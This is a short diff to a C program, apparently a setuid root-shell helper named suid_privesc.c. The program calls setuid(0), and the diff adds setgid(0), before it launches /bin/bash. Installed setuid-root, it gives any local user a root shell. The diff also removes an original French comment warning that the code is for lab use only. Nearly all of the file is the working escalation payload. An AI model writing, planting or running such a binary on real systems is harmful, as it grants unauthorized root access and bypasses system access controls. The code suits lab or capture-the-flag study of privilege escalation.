@@ -1,9 +1,11 @@
-// Exemple simple - DANGER : à ne pas utiliser hors lab
+// suid_privesc.c
 #include <stdlib.h>
 #include <unistd.h>
 
 int main() {
     setuid(0);
+    setgid(0);
     system("/bin/bash");
     return 0;
 }
+
